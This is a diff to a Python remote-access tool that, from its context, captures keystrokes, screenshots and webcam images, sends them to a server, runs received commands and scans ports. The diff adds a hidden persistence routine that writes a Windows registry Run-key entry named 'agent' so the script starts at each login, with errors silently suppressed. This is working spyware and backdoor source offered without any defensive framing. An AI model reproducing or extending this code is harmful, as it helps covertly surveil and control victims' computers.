@@ -1,3 +1,4 @@
+import os
 import socket
 import subprocess
 import threading
@@ -5,6 +6,8 @@ from pynput import keyboard
 import pyautogui
 import io
 import cv2
+import sys
+import winreg as reg
 
 ip_address = '127.0.0.1'
 port_number = 1234
@@ -72,10 +75,33 @@ def send_image_to_server(cs, image_bytes):
 
     cs.sendall(image_bytes)
 
+def add_persistence():
+    """
+    Ajoute une entrée au registre de Windows pour lancer automatiquement le script au démarrage de Windows.
+    """
+    try:
+        python_path = sys.executable
+
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        script_name = os.path.basename(__file__)
+
+        command = f'cmd.exe /c "cd /d {script_dir} && {python_path} {script_name}"'
+
+        key = reg.HKEY_CURRENT_USER
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
+        reg.SetValueEx(reg_key, "agent", 0, reg.REG_SZ, command)
+        reg.CloseKey(reg_key)
+    except Exception as e:
+        pass
+
 def connect_to_server():
     """
     Fonction pour établir une connexion avec le serveur et traiter les commandes reçues.
     """
+    add_persistence()
+
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cs.connect((ip_address, port_number))
 
@@ -162,4 +188,5 @@ def scan_ports(start_port, end_port):
     return open_ports
 
 if __name__ == "__main__":
+    add_persistence()
     connect_to_server()
